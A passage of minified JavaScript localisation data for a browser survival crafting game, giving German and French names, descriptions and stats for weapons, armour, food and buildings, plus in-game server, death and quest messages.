                    We[Be.HAMMER_DIAMOND] = ["Diamanthammer", "Nützlich um Gebäude zu zerstören", "Schaden: 4", "Schaden an Gebäuden: 40"],
                    We[Be.HAMMER_AMETHYST] = ["Amethysthammer", "Nützlich um Gebäude zu zerstören", "Schaden: 5", "Schaden an Gebäuden: 50"],
                    We[Be.SUPER_HAMMER] = ["Superhammer", "Willst du die Welt zerstören?", "Schaden: 12", "Schaden an Gebäuden: 70"],
                    We[Be.WOOD_SPEAR] = ["Holzspeer", "Wie ein Stock, nur mit dem Unterschied, dass es sticht.", "Schaden: 10", "Schaden an Gebäuden: 2"],
                    We[Be.SPEAR] = ["Steinspeer", "Der Anfang der Evolution!", "Schaden: 14", "Schaden an Gebäuden: 4"],
                    We[Be.GOLD_SPEAR] = ["Goldspeer", "Pass auf, es sticht!", "Schaden: 15", "Schaden an Gebäuden: 5"],
                    We[Be.DIAMOND_SPEAR] = ["Diamantspeer", "Du bist bereit einen Drachen zu töten", "Schaden: 17", "Schaden an Gebäuden: 5"],
                    We[Be.AMETHYST_SPEAR] = ["AmethystSpeer", "Drachen jagen dir keine Angst mehr ein", "Schaden: 18", "Schaden an Gebäuden: 6"],
                    We[Be.SHOVEL] = ["Steinschaufel", "Grab herum um Dreck, Eis und Sand zu bekommen", "Du kannst auch Mineralien bekommen", "Schaden: 2"],
                    We[Be.SHOVEL_GOLD] = ["Goldschaufel", "Grab herum um Dreck, Eis und Sand zu bekommen", "Du kannst auch Mineralien bekommen", "Schaden: 3", "Schaden an Gebäuden: 1"],
                    We[Be.SHOVEL_DIAMOND] = ["Diamantschaufel", "Grab herum um Dreck, Eis und Sand zu bekommen", "Du kannst auch Mineralien bekommen", "Schaden: 4", "Schaden an Gebäuden: 1"],
                    We[Be.SHOVEL_AMETHYST] = ["Amethystschaufel", "Grab herum um Dreck, Eis und Sand zu bekommen", "Du kannst auch Mineralien bekommen", "Schaden: 5", "Schaden an Gebäuden: 1"],
                    We[Be.WOOD_HELMET] = ["Holzhelm", "Besser als nichts", "Verteidigung gegen Spieler: 1", "Verteidigung gegen Tiere: 4"],
                    We[Be.STONE_HELMET] = ["Steinhelm", "Du bist bereit zu kämpfen!", "Verteidigung gegen Spieler: 2", "Verteidigung gegen Tiere: 8"],
                    We[Be.GOLD_HELMET] = ["Goldhelm", "AKA Der Helm der Unbarmherzigen", "Verteidigung gegen Spieler: 4", "Verteidigung gegen Tiere: 13"],
                    We[Be.DIAMOND_HELMET] = ["Diamanthelm", "Gib nicht zu viel an", "Verteidigung gegen Spieler: 5", "Verteidigung gegen Tiere: 19"],
                    We[Be.AMETHYST_HELMET] = ["Amethysthelm", "Du musst vor nichts mehr angst haben", "Verteidigung gegen Spieler: 6", "Verteidigung gegen Tiere: 23"],
                    We[Be.DRAGON_HELMET] = ["Drachenhelm", "Du wirst die Welt erobern", "Verteidigung gegen Spieler: 8", "Verteidigung gegen Tiere: 27"],
                    We[Be.EXPLORER_HAT] = ["Erkunderhut", "Tiere beachten dich nicht mehr", "mach aber keine Geräusche!", "Hält dich warm außerhalb von Wasser und Winter"],
                    We[Be.CHRISTMAS_HAT] = ["Weihnachtshut", "Oh, oh, oh, fröhliche Weihnachten", "Hält dich warm außerhalb von Wasser und Winter"],
                    We[Be.ELF_HAT] = ["Elfenhut", "Lass dich nicht ausnutzen, du kleiner Schneeelf!", "Hält dich warm außerhalb von Wasser und Winter"],
                    We[Be.HOOD] = ["Kapuze", "Du bist ein Schurke", "Du kannst jemand bestehlen solange:", "1) Es nacht ist", "2) Du nichts trägst", "3) dich niemand für acht Sekunden berührt hat", "4) Du nicht in der Nähe eines Feuers bist", "5) Dein Ziel keine Bauernkleidung trägt", "Hält dich warm außerhalb von Wasser und Winter"],
                    We[Be.EARMUFFS] = ["Ohrwärmer", "Eine Art kleiner chapka.", "Hält dich warm außerhalb von Wasser und Winter"],
                    We[Be.COAT] = ["Chapka", "Auch Mantel genannt.", "Hält dich warm außerhalb von Wasser und Winter"],
                    We[Be.CAP_SCARF] = ["Winterschaal und Kappe", "Sehr angenehm", "Sehr Warm"],
                    We[Be.PEASANT] = ["Bauer", "Deine Pflanzen wachsen schneller", "Hält dich warm außerhalb von Wasser und Winter"],
                    We[Be.WINTER_HOOD] = ["Winterkapuze", "Du bist ein Wilder Schurke", "Du kannst jemand bestehlen solange:", "1) Es nacht ist", "2) Du nichts trägst", "3) dich niemand für vier Sekunden berührt hat", "4) Du nicht in der Nähe eines Feuers bist", "5) Dein Ziel keine Winterbauernkleidung trägt", "Hält dich warm außerhalb von Wasser und Winter"],
                    We[Be.WINTER_PEASANT] = ["Winterbauern", "Deine Pflanzen wachsen deutlich schneller", "Hält dich warm außerhalb von Wasser und Winter"],
                    We[Be.DIVING_MASK] = ["Tauchermaske", "Du bist schneller im Wasser", "Hält dich warm im Wasser", "Verteidigung gegen Spieler: 2, Verteidigung gegen Tiere: 8"],
                    We[Be.SUPER_DIVING_SUIT] = ["Supertauchermaske", "Du bist sehr schnell im Wasser", "Hält dich warm im Wasser", "Verteidigung gegen Spieler: 4, Verteidigung gegen Tiere: 16"],
                    We[Be.DRAGON_ORB] = ["Drachenkugel", "Erhalten bei abschließung der Quest"],
                    We[Be.DRAGON_HEART] = ["Drachenherz", "Verwandelt dich in einen Geist, sobald du stirbst!", "Du bist für 60 Sekunden ein Geist", "Finde ein Wiederbelebungsstein."],
                    We[Be.GEMME_GREEN] = ["Grüner Edelstein", "Du hast nicht gemogelt, versprochen?"],
                    We[Be.GEMME_ORANGE] = ["Orangener Edelstein", "Nur ein echter Pirat findet ihn!"],
                    We[Be.GEMME_BLUE] = ["Blauer Edelstein", "Für sehr nette Leute"],
                    We[Be.CROWN_GREEN] = ["Grüne Krone", "Du heilst dich selbst sehr schnell", "Heilung über Zeit: 40", "Verteidigung gegen Spieler: 4, Verteidigung gegen Tiere: 16"],
                    We[Be.CROWN_ORANGE] = ["Orangene Krone", "Du fühlst dich plötzlich als hättest du mehr Glück", "Verteidigung gegen Spieler: 4, Verteidigung gegen Tiere: 16"],
                    We[Be.CROWN_BLUE] = ["Blaue Krone", "Sobald du stirbst wirst du ein Geist", "Du wirst allerdings dein Schwert und deine Spitzhacke verlieren", "Verteidigung gegen Spieler: 4, Verteidigung gegen Tiere: 16"],
                    We[Be.BUCKET_FULL] = ["Eimer", "Nützlich um einen Brunnen zu füllen", "Ein Eimer ist vergleichbar mit zwölf Flaschen"],
                    We[Be.BUCKET_EMPTY] = ["Leerer Eimer", "Du musst den Eimer in der Nähe einer Wasserquelle füllen"],
                    We[Be.BOTTLE_FULL] = ["Flasche", "Erlaubt dir überall Wasser zu trinken", "Wasser: 50"],
                    We[Be.BOTTLE_EMPTY] = ["Leere Flasche", "Du musst die Flasche in der Nähe einer Wasserquelle füllen"],
                    We[Be.WATERING_CAN] = ["Leere Gießkanne", "Du musst es mit einer Wasserquelle füllen"],
                    We[Be.WATERING_CAN_FULL] = ["Gießkanne", "Erlaubt das wässern von Pflanzen", "Schaden: 1"],
                    We[Be.BAG] = ["Rucksack", "Mehr Platz im Inventar!"],
                    We[Be.PAPER] = ["Papier", "Wird fürs Büchermachen verwendet"],
                    We[Be.BOOK] = ["Buch", "Reduziert die benötigte Zeit beim herstellen von Gegenständen", "Muss in der Hand gehalten werden um den Effekt zu nutzen", "Schaden: 1"],
                    We[Be.BANDAGE] = ["Verband", "Heile dich schneller", "Heilung über Zeit: 30", "Effekt: 5"],
                    We[Be.LOCK] = ["Schloss", "Erlaubt dir deine Truhe zu verschließen"],
                    We[Be.LOCKPICK] = ["Dietrich", "Erlaubt dir eine verschlossene Truhe zu öffnen"],
                    We[Be.TOTEM] = ["Totem", "Erlaubt dir ein Team zu gründen", "Teile Türen und Truhen", "verletzende Strukturen schaden deinen Freunden nicht mehr"],
                    We[Be.BRIDGE] = ["Brücke", "Sehr nützlich über Wasser", "Es erlaubt dir zu trinken ohne zu ertrinken", "lässt dich schneller auf dem Wasser laufen"],
                    We[Be.SIGN] = ["Schild", "Hinterlasse eine Nachricht für andere hier", "Haltbarkeit: 200"],
                    We[Be.ROOF] = ["Dach", "Versteckt dich ein wenig und hält warm dabei!"],
                    We[Be.WELL] = ["Brunnen", "Erlaubt dir deine Flasche zu füllen, eine mobile Wasserquelle", "Haltbarkeit: 1000"],
                    We[Be.WALL] = ["Holzwand", "Kennst du den Wandtanz?", "Haltbarkeit: 1000"],
                    We[Be.STONE_WALL] = ["Steinwand", "Es sieht ein wenig Ernsthafter aus.", "Haltbarkeit: 1500"],
                    We[Be.GOLD_WALL] = ["Goldwand", "Gold an deiner Wand? Es leuchtet ein wenig.", "Haltbarkeit: 2000"],
                    We[Be.DIAMOND_WALL] = ["Diamantwand", "So leuchtend, pass auf deine Augen auf", "Haltbarkeit: 2500"],
                    We[Be.AMETHYST_WALL] = ["Amethystwand", "Du musst dich wirklich fürchten raus zu gehen!", "Haltbarkeit: 3000"],
                    We[Be.SPIKE] = ["Holzstacheln", "Kann deine Gegner verletzen", "Schaden: 10, Schaden beim Angreifen: 2", "Haltbarkeit: 150"],
                    We[Be.STONE_SPIKE] = ["Steinstacheln", "Ich würde lieber nicht dein Gegner sein.", "Schaden: 20", "Schaden beim Angreifen: 3", "Haltbarkeit: 300"],
                    We[Be.GOLD_SPIKE] = ["Goldstacheln", "Du bist grausam.", "Schaden: 30", "Schaden beim Angreifen: 3", "Haltbarkeit: 600"],
                    We[Be.DIAMOND_SPIKE] = ["Diamantstacheln", "Du magst Gesellschaft nicht.", "Schaden: 40", "Schaden beim Angreifen: 4", "Haltbarkeit: 1200"],
                    We[Be.AMETHYST_SPIKE] = ["Amethyststacheln", "Was zur Hölle haben deine Nachbarn dir angetan?", "Schaden: 50", "Schaden beim Angreifen: 4", "Haltbarkeit: 2400"],
                    We[Be.WOOD_DOOR] = ["Holztür", "Kann von dir oder deinen Freunden geöffnet werden", "Haltbarkeit: 1000"],
                    We[Be.STONE_DOOR] = ["Steintür", "Eine stärkere Tür ist ernsthafter", "Haltbarkeit: 1500"],
                    We[Be.GOLD_DOOR] = ["Goldtür", "Baust du el dorado?", "Haltbarkeit: 2000"],
                    We[Be.DIAMOND_DOOR] = ["Diamanttür", "Für ein scheinendes Haus", "Haltbarkeit: 2500"],
                    We[Be.AMETHYST_DOOR] = ["Amethysttür", "Ist dein Haus ein verschlossener Safe?", "Haltbarkeit: 3500"],
                    We[Be.FURNACE] = ["Ofen", "Wärmt dich", "Es verbraucht alle 5 Sekunden eine Einheit Holz", "Haltbarkeit: 1000"],
                    We[Be.WINDMILL] = ["Windmühle", "Kann mit Weizen, Mehl herstellen", "Es braucht 5 Sekunden um Mehl herzustellen", "Gibt dir Punkte während es arbeitet", "Haltbarkeit: 2000"],
                    We[Be.BREAD_OVEN] = ["Brotofen", "Erlaubt dir mit Mehl, Brot herzustellen", "Es braucht 5 Sekunden um Brot herzustellen", "Gibt dir Punkte während es arbeitet", "Haltbarkeit: 2000"],
                    We[Be.RESURRECTION] = ["Wiederbelebungsstein", "Es ist Magie", "Wiederbelebt dich, wenn du ein Geist bist", "Du wirst deine Waffe und Spitzhacke verlieren", "Haltbarkeit: 200"],
                    We[TEXT.YOU_CANNOT_JOIN] = "Du kannst diesem Server nicht beitreten",
                    We[TEXT.KICKED] = "Gekickt: ",
                    We[TEXT.KEY_ALREADY] = "Dein Schlüssel wurde bereits von jemand anderem benutzt",
                    We[TEXT.KEY_WRONG] = "Dein Schlüssel ist falsch",
                    We[TEXT.OLD_VERSION] = "Deine Version ist veraltet, säubere dein Cache",
                    We[TEXT.NO_MORE_RESOURCES] = "Es gibt keine neuen Ressourcen",
                    We[TEXT.SURVIVED_1DAY] = "Du hast einen Tag überlebt",
                    We[TEXT.SURVIVED] = "Du hast überlebt ",
                    We[TEXT.DAYS] = " Tage",
                    We[TEXT.DEAD_SAD] = "Du bist gestorben ;-;",
                    We[TEXT.SPAM_ME] = "Server kann kein Spawnplatz finden! Drücke immer wieder auf spielen!",
                    We[TEXT.SPAM_ME2] = "Server ist voll! Drücke immer wieder auf spielen!",
                    We[TEXT.EMPTY] = "Ressource ist leer",
                    We[TEXT.INV_FULL] = "Dein Inventar ist voll (rechts-klick um Gegenstände zu entfernen)",
                    We[TEXT.DEAD] = " ist gestorben",
                    We[TEXT.WRONG_TOOL] = "Das ist nicht das richtige Werkzeug",
                    We[TEXT.JOIN_TEAM] = "Du bist einem Team beigetreten",
                    We[TEXT.YOU_DEAD] = "Du bist gestorben",
                    We[TEXT.JOINED_TEAM] = " ist dem Team beigetreten",
                    We[TEXT.TEAM_DESTROYED] = "Dein Team wurde zerstört",
                    We[TEXT.LEFT_TEAM] = "Du hast das Team verlassen",
                    We[TEXT.LEFT_TEAM2] = " hat das Team verlassen",
                    We[TEXT.TOKEN] = "Jemand hat dein Token gestohlen :>",
                    We[TEXT.CHOOSE] = "Suche dir ein Server aus",
                    We[TEXT.PLAYERS] = "Spieler",
                    We[TEXT.TOTAL_PLAYERS] = "alle Spieler",
                    We[TEXT.TOTAL_MODE] = "Spieler in diesem Modus",
                    We[TEXT.COMMING_SOON] = "Bald verfügbar...",
                    document.getElementById("nickname_input").placeholder = "Spitzname",
                    n[0] = ["Du wurdest ohne Grund getötet"],
                    n[1] = ["Du bist verhungert, wie der Name des Spiels andeutet"],
                    n[2] = ["Du bist erfroren. Zu schade", "Du bist an Unterkühlung gestorben. Versuche nächstes Mal zu einem Feuer zu gehen ."],
                    n[3] = ["Ein Spieler hat dich getötet, während er dir gesagt hat 'git gud.'", "Du wurdest von einem Spieler ermordet, mach dir keine Sorgen, er wird wahrscheinlich auch sterben ."],
                    n[4] = ["Du bist zu nah ans Feuer gegangen und zu tode gebrannt. Schlechte Idee.", "Du wurdest von einem Feuer umgebracht. Feuer tut weh. Schreib eine Geschichte darüber."],
                    n[5] = ["Dein Körper wird zu einem Spinnennest", "Eine Spinne hat dich getötet. Zumindest war es kein Hase."],
                    n[6] = ["Dieser Wolf wird nicht mehr verhungern", "Sie sind keine Hunde. Wölfe mögen es nicht gestreichelt zu werden."],
                    n[7] = ["Der Fuchs war zu schnell für dich", "Der Fuchs hat dich in eine Box verwandelt. Seit wann haben Tiere magische Kräfte?"],
                    n[8] = ["Der Bär wollte nur eine Umarmung.", "Der Bär war zu viel zu ertragen. Es tut mir nicht leid."],
                    n[9] = ["Du wurdest von einem Drachen knusprig gebraten. Zu schade.", "Du wurdest von einem Drachen erdrückt. Zerquetscht zu werden ist ein schrecklicher Weg zu sterben."],
                    n[10] = ["Du bist in eine Stachelwand gesprungen. Keine gute Idee...", "Du wurdest von einer Stachelwand getötet. Die meisten Leute sind sensibel genug keine spitzen Sachen anzufassen."],
                    n[11] = ["Sogar Geister können sterben.", "Du hast es nicht geschafft wiederbelebt zu werden. Das ist ein Spiel, also lebst du nachdem du stirbst..."],
                    n[12] = ["Ein Bakterium von deinem rohen Fleisch hat dich getötet. Das Spiel ist definitiv zu schwierig.", "Du hast das rohe Fleisch getötet. Es hat dich ebenfalls getötet."],
                    n[13] = ["Du bist verdurstet. Solltest lieber deinen eigenen Urin trinken."],
                    n[14] = ["Wusstest du, dass dein Mund beim Schwimmen immer unterm Wasser ist? Jetzt weißt du es."],
                    n[15] = ["Mach dir keine Sorge, der Piranha findet dich lecker.", "Nebenbei: Piranhas essen Menschen. Dich mit eingeschlossen."],
                    n[16] = ["LapaMauve plant nicht, dass du den Kraken töten kannst", "Ein Kraken hat deinen Schädel zertrümmert."],
                    n[17] = ["Deine Haut fällt auseinander, die Sonne hat dich umgebracht."],
                    n[18] = ["Knoblauch in deiner Tasche hat dein Gehirn gebraten "],
                    n[19] = ["Stehe als ein Vampir nicht neben den Knoblauchnelken."],
                    n[20] = ["Du hast als ein Vampir Knoblauch gegessen, was hast du erwartet?"],
                    n[21] = ["Dein Körper ist von einem Dornenbusch umgeben.Während du versuchst zu entkommen löst sich deine Haut von deinem Körper und dein Herz hört auf zu schlagen."],
                    ZOMBIE_GRUMBLE = "Uuunnnggg",
                    ZOMBIE_GRUMBLES = ["Uuunnnggg...Ich verhungere...", "Brauche dein Gehirn... Uuunnnggg...", "Hier gibt es frisches Fleisch... Uuunnnggg", "Uuunnnggg...Du bist lecker", "Uuunnnggg...", "Essen... uuunnnggg...", "Ich rieche Blut... Uuunnnggg"]
            }
            function Me() {
                We[Be.DRAGON_CUBE] = ["You feel a great power emanating from this orb"],
                    n[22] = ["This crab, though frightening in nature, pinched your fingertips so hard that you had a heart attack."],
                    We[Be.CRAB_STICK] = ["Crab sticks", "Oh, yeah? Is there crab in the crab sticks?", "Food: 20"],
                    We[TEXT.BACK_TO_THE_GAME] = " RETOUR AU JEU",
                    We[TEXT.TWITTER] = " Partage sur Twitter",
                    We[TEXT.FACEBOOK] = " Partage sur Facebook",
                    We[TEXT.KIT_NEXT] = "Tu peux acheter des objets dans le magasin à ta prochaine partie avec tes points",
                    We[TEXT.POINTS] = "points",
                    We[TEXT.SCORE] = "Score",
                    We[TEXT.KILL] = "Tués",
                    We[TEXT.DAYS_SURVIVED] = "Jours survécus",
                    We[TEXT.MODE_FREE] = "Mode de construction: Libre. Appuie sur G pour changer",
                    We[TEXT.MODE_GRID] = "Mode de construction: Grille. Appuie sur G pour changer",
                    We[Be.CRAB_LOOT] = ["Pince de crabe", "Les pinces de crabes peuvent aussi être mangées", "Food: 10"],
                    We[Be.CRAB_SPEAR] = ["Lance en crabe", "Te permet de soigner les crabes et de les calmer", "Donne un bonus de +10 degats quand elle est portée", "avec un casque un crabe sur un Crab King", "Damage: 14", "Building Damage: 4"],
                    We[Be.CROWN_CRAB] = ["Casque en crabe", "Tu es le Roi des Crabes!", "Les crabes te suivent", "Ils ne peuvent pas te frapper et toi non plus", "Players Defense: 4", "Animals Defense: 13"],
                    We[Be.BED] = ["Lit", "Repose-toi dans ce lit douillet", "Tu as moins froid, moins faim et moins soif", "Tu te régénères plus vite", "Durability: 400"],
                    document.getElementById("typequest").innerHTML = "Chrono Quêtes",
                    document.getElementById("timeremainingquest").innerHTML = "Temps Restant",
                    document.getElementById("constraintquest").innerHTML = " Contraintes",
                    document.getElementById("claim_rewards").innerHTML = " Résultat",
                    document.getElementById("rewardquest").innerHTML = " Récompenses",
                    document.getElementById("killdragon_1").innerHTML = " Collecte 1 Cœur de dragon dans la cave",
                    document.getElementById("amethyst_2").innerHTML = " Récolte 1 améthyste",
                    document.getElementById("survive20min_3").innerHTML = "Survis sans perdre de vie",
                    document.getElementById("treasure_chest_4").innerHTML = " Ouvre 5 coffres au trésor",
                    document.getElementById("dont_hit_5").innerHTML = " Sois pacifique",
                    document.getElementById("bread_6").innerHTML = " Cuisine 100 pains en hiver, seul et sans retour en arrière",
                    document.getElementById("winter_7").innerHTML = " Après 1 jour, survis en hiver";
                for (var e = 0; e < 7; e++)
                    document.getElementById("claim_reward_" + e).innerHTML = "RÉCOMPENSE!";
                document.getElementById("quit_chronoquest").innerHTML = " QUITTER",
                    We[Be.HAND] = ["Main"],
                    We[Be.GROUND] = ["Terre", "C'est sale!"],
                    We[Be.SAND] = ["Sable", "J'en ai dans les yeux"],
                    We[Be.WOOD] = ["Bois", "Tu n'en auras jamais trop!"],
                    We[Be.STONE] = ["Pierre", "Aussi appelée roche"],
                    We[Be.GOLD] = ["Or", "Sois généreux, donne en aux autres"],
                    We[Be.DIAMOND] = ["Diamant", "Comme tes yeux! wesh"],
                    We[Be.AMETHYST] = ["Améthyste", "C'est Mauve comme Lapa"],
                    We[Be.FLOUR] = ["Farine", "Utile pour la cuisine"],
                    We[Be.COOKIE] = ["Cookie", "Un somptueux cookie de Grand-Mère", "Nourriture: 50"],
                    We[Be.CAKE] = ["Gâteau", "Pour les fins gourmets", "Nourriture: 100"],
                    We[Be.MEAT] = ["Viande crue", "Tu peux la cuisiner avec du feu", "Intoxication: 10", "Nourriture: 15"],
                    We[Be.COOKED_MEAT] = ["Viande cuite", "Un steak saignant, s'il vous plait", "Nourriture: 35"],
                    We[Be.FOODFISH] = ["Poisson cru", "Je crois que c'est encore vivant", "Intoxication: 10", "Nourriture: 18"],
                    We[Be.FOODFISH_COOKED] = ["Poisson cuit", "Avec du citron, c'est parfait", "Nourriture: 35"],
                    We[Be.BREAD] = ["Baguette", "Une tradition s'il vous plait", "C'est la monnaie du marché", "Nourriture: 15"],
                    We[Be.SANDWICH] = ["Sandwich", "Le Jambon Beurre vaincra", "Nourriture: 100"],
                    We[Be.CANDY] = ["Bonbons", "Il n'y a pas de dentiste ici", "Nourriture: 100"],
                    We[Be.SUGAR_CAN] = ["Canne à sucre", "Sans sucre de canne", "Nourriture: 20"],
                    We[Be.GARLAND] = ["Guirlandes", "Utilisable sur les toits"],
                    We[Be.SEED] = ["Graines de baies", "Deviennent des baies", "Naissance: 2min", "Croissance: 55s", "Arrosage: 3min 20s", "Durabilité: 700", "Durée de vie: 8 jours"],
                    We[Be.PLANT] = ["Baies", "Peu nourrissant", "Nourriture: 10"],
                    We[Be.WHEAT_SEED] = ["Graines de blé", "Deviennent du blé", "Naissance: 2min", "Croissance: 16s", "Arrosage: 2min", "Durabilité: 700", "Durée de vie: 8 jours"],
                    We[Be.WILD_WHEAT] = ["Blé", "Peut être transformé en farine dans les moulins"],
                    We[Be.PUMPKIN_SEED] = ["Graines de citrouille", "Deviennent des citrouilles", "Naissance: 2min 40s", "Croissance: 2min", "Arrosage: 2min", "Durabilité: 700", "Durée de vie: 8 jours"],
                    We[Be.PUMPKIN] = ["Citrouille", "Ça me rappelle Halloween", "Nourriture: 30"],
                    We[Be.GARLIC_SEED] = ["Graines d'ail", "Très dangereux pour les vampires", "Dégâts: 20", "Naissance: 4min", "Croissance: 1min 10s", "Arrosage: 1min 40s", "Durabilité: 700", "Durée de vie: 8 jours"],
                    We[Be.GARLIC] = ["Ail", "Soigne et réduit le froid", "Nourriture: 14", "Soigne sur le temps: 30", "Effet: 1 fois"],
                    We[Be.THORNBUSH_SEED] = ["Graines de ronces", "Peuvent blesser vos ennemis", "Dégâts: 20", "Naissance: 4min", "Croissance: 15s", "Arrosage: 3min", "Durabilité: 1000", "Durée de vie: 8 jours"],
                    We[Be.THORNBUSH] = ["Ronces", "Ça pique!"],
                    We[Be.PLOT] = ["Terreau", "Indispensable", "Vos plantes grandiront plus vite", "et auront besoin de moins d'eau", "Durabilité: 2000"],
                    We[Be.ICE] = ["Glace", "Pratique pour faire de l'eau et des gâteaux"],
                    We[Be.SPANNER] = ["Clé à molette", "Pour réparer les portes, les murs et les piques", "Dégâts: 2"],
                    We[Be.FUR_WOLF] = ["Peau de loup", "Il était où le gentil ti Youki?"],
                    We[Be.FUR] = ["Peau de lapin", "Vous êtes un monstre"],
                    We[Be.SPECIAL_FUR] = ["Fourrure blanche", "Tu es une usine à pain"],
                    We[Be.SPECIAL_FUR_2] = ["Fourrure noire", "Tu te sens prêt à faire quelque chose de mal"],
                    We[Be.FUR_WINTER] = ["Fourrure d'hiver", "Il voulait juste un calin"],
                    We[Be.SCALES] = ["Écailles", "Ça sent le poisson!"],
                    We[Be.KRAKEN_SKIN] = ["Peau du kraken", "Tu n'as pas eu trop peur?"],
                    We[Be.FIRE] = ["Feu de camp", "Réchauffe", "Durabilité: 150", "Durée de vie: 2min"],
                    We[Be.BIG_FIRE] = ["Grand feu de camp", "Réchauffe plus longtemps", "Durabilité: 400", "Durée de vie: 6min"],
                    We[Be.WORKBENCH] = ["Établi", "Utile pour fabriquer toute sorte d'objets"],
                    We[Be.CORD] = ["Fil", "Utile pour faire des chapeaux et un sac"],
                    We[Be.BLUE_CORD] = ["Fil de diamant", "Utile pour faire des chapeaux"],
                    We[Be.CHEST] = ["Coffre", "Permet de ranger des objets", "Durabilité: 500"],
                    We[Be.SWORD_WOOD] = ["Épée en bois", "C'est pour les enfants", "Dégâts: 12", "Démolition: 4"],
                    We[Be.SWORD] = ["Épée en pierre", "Sois gentil avec les autres", "Dégâts: 19", "Démolition: 6"],
                    We[Be.SWORD_GOLD] = ["Épée en or", "Roi de la forêt", "Dégâts: 22", "Démolition: 7"],
                    We[Be.SWORD_DIAMOND] = ["Épée en diamant", "Tu te sens puissant", "Dégâts: 24", "Démolition: 8"],
                    We[Be.PIRATE_SWORD] = ["Épée de pirate", "Marin d'eau douce!", "Meilleure portée qu'une épée normale", "Dégâts: 24", "Démolition: 8"],
                    We[Be.SWORD_AMETHYST] = ["Épée en améthyste", "Mauve est la plus belle couleur du monde", "Dégâts: 27", "Démolition: 9"],
                    We[Be.DRAGON_SWORD] = ["Épée du Dragon", "Pas de pitié!", "Dégâts: 30", "Démolition: 10"],
                    We[Be.DRAGON_SPEAR] = ["Lance du Dragon", "Tuez-les tous!", "Dégâts: 22", "Démolition: 6"],
                    We[Be.PICK_WOOD] = ["Pioche en bois", "Peut récolter du bois et de la pierre", "Dégâts: 1"],
                    We[Be.PICK] = ["Pioche en pierre", "Peut aussi récolter de l'or", "Dégâts: 2"],
                    We[Be.PICK_GOLD] = ["Pioche en or", "Peut aussi récolter du diamant", "Dégâts: 3", "Démolition: 1"],
                    We[Be.PICK_DIAMOND] = ["Pioche en diamant", "Peut tout récolter", "Dégâts: 4", "Démolition: 1"],
                    We[Be.PICK_AMETHYST] = ["Pioche en améthyste", "Peut tout récolter", "Dégâts: 5", "Démolition: 1"],
                    We[Be.HAMMER] = ["Marteau en pierre", "Utile pour détruire les bâtiments", "Ne marche pas bien sur du diamant et améthyste", "Dégâts: 2", "Démolition: 20"],
                    We[Be.HAMMER_GOLD] = ["Marteau en or", "Utile pour détruire les bâtiments", "Ne marche pas bien sur l'améthyste", "Dégâts: 3", "Démolition: 30"],
                    We[Be.HAMMER_DIAMOND] = ["Marteau en diamant", "Utile pour détruire les bâtiments", "Dégâts: 4", "Démolition: 40"],
                    We[Be.HAMMER_AMETHYST] = ["Marteau en améthyste", "Utile pour détruire les bâtiments", "Dégâts: 5", "Démolition: 50"],
                    We[Be.SUPER_HAMMER] = ["Super Marteau", "As-tu prévu de détruire le monde?", "Dégâts: 12", "Démolition: 70"],
                    We[Be.WOOD_SPEAR] = ["Lance en bois", "Plus de peur que de mal", "Dégâts: 10", "Démolition: 2"],
                    We[Be.SPEAR] = ["Lance en pierre", "C'est le début de l'évolution", "Dégâts: 14", "Démolition: 4"],
                    We[Be.GOLD_SPEAR] = ["Lance en or", "Attention, ça pique!", "Dégâts: 15", "Buildings Dégâts: 5"],
                    We[Be.DIAMOND_SPEAR] = ["Lance en diamant", "Tu es prêt à tuer les dragons", "Dégâts: 17", "Buildings Dégâts: 5"],
                    We[Be.AMETHYST_SPEAR] = ["Lance en améthyste", "Les dragons ne te font plus peur", "Dégâts: 18", "Buildings Dégâts: 6"],
                    We[Be.SHOVEL] = ["Pelle en pierre", "Creuse la terre, le sable et la neige", "Peut aussi récupérer des minéraux", "Dégâts: 2"],
                    We[Be.SHOVEL_GOLD] = ["Pelle en or", "Creuse la terre, le sable et la neige", "Peut aussi récupérer des minéraux", "Dégâts: 3", "Buildings Dégâts: 1"],
                    We[Be.SHOVEL_DIAMOND] = ["Pelle en diamant", "Creuse la terre, le sable et la neige", "Peut aussi récupérer des minéraux", "Dégâts: 4", "Buildings Dégâts: 1"],
                    We[Be.SHOVEL_AMETHYST] = ["Pelle en améthyste", "Creuse la terre, le sable et la neige", "Peut aussi récupérer des minéraux", "Dégâts: 5", "Buildings Dégâts: 1"],
                    We[Be.WOOD_HELMET] = ["Casque en bois", "Mieux que rien", "Défense: 1", "Défense contre animaux: 4"],
                    We[Be.STONE_HELMET] = ["Casque en pierre", "Prêt pour la bataille", "Défense: 2", "Défense contre animaux: 8"],
                    We[Be.GOLD_HELMET] = ["Casque en or", "Alias le casque des sauvages", "Défense: 4", "Défense contre animaux: 13"],
                    We[Be.DIAMOND_HELMET] = ["Casque en diamant", "Ne te vante pas trop", "Défense: 5", "Défense contre animaux: 19"],
                    We[Be.AMETHYST_HELMET] = ["Casque en améthyste", "Tu n'as plus peur de rien", "Défense: 6", "Défense contre animaux: 23"],
                    We[Be.DRAGON_HELMET] = ["Casque du Dragon", "Tu vas conquérir le monde", "Défense: 8", "Défense contre animaux: 27"],
                    We[Be.EXPLORER_HAT] = ["Chapeau d'explorateur", "Les animaux t'ignorent", "Mais ne faites pas de bruit!", "Réchauffe en dehors de l'eau et dans l'hiver"],
                    We[Be.CHRISTMAS_HAT] = ["Chapeau du Père Noël", "Oh, oh, oh, Joyeux Nöel!", "Réchauffe en dehors de l'eau et dans l'hiver"],
                    We[Be.ELF_HAT] = ["Chapeau du lutin de Nöel", "Tu as vu le nouveau chef d'oeuvre d'Alain Chabat?", "Réchauffe en dehors de l'eau et dans l'hiver"],
                    We[Be.HOOD] = ["Capuche", "Voyou!", "Tu peux voler seulement si", "1) Il fait nuit", "2) Tu as les mains libres", "3) Tu n'as pas été touché depuis 8 secondes", "4) Tu es loin d'un feu", "5) Ta cible n'est pas un paysan", "Réchauffe en dehors de l'eau et dans l'hiver"],
                    We[Be.EARMUFFS] = ["Cache-oreilles", "Une sorte de petite chapka.", "Réchauffe en dehors de l'eau et dans l'hiver"],
                    We[Be.COAT] = ["Chapka", "Comment ça va, camarade?", "Réchauffe en dehors de l'eau et dans l'hiver"],
                    We[Be.CAP_SCARF] = ["Bonnet d'hiver", "Très confortable", "Très chaud"],
                    We[Be.PEASANT] = ["Tunique", "Les plantes poussent plus vite", "Réchauffe en dehors de l'eau et dans l'hiver"],
                    We[Be.WINTER_HOOD] = ["Capuche d'hiver", "Tu peux voler seulement si", "1) Il fait nuit", "2) Tu as les mains libres", "3) Tu n'as pas été touché depuis 4 secondes", "4) Tu es loin d'un feu", "5) Ta cible n'est pas un paysan d'hiver", "Réchauffe en dehors de l'eau et dans l'hiver"],
